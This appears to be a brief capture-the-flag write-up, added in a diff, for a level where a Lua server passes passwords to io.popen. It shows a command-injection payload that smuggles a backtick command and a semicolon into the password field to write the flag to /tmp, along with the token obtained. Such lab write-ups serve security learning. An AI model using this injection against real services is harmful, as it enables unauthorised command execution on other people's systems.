@@ -1,0 +1,15 @@
+Echo exploit again :) 
+
+ps -aux show us list of all process, in them a lua is executed with the level11.lua
+
+the hash function of the server use io.popen, it's a cmd call so let's input a password who execude other program 
+like
+```
+	`getflag` > /tmp/flag11 ; echo salut
+```
+and it will put the flag in /tmp/flag11 
+```
+	cat /tmp/flag11
+
+	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
